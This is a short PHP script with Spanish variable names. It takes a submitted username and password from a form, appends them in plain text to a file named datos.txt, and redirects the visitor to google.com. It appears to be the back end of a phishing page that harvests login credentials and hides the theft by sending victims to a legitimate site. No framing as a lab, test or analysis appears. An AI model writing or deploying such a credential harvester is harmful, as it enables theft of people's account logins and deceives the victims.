<?php

$usuario = $_POST['usuario'];
$password = $_POST['password'];

$archivo = fopen("datos.txt", "a");

fwrite($archivo, "Usuario: ".$usuario." | Password: ".$password."\n");

fclose($archivo);

header("Location: https://google.com");

?>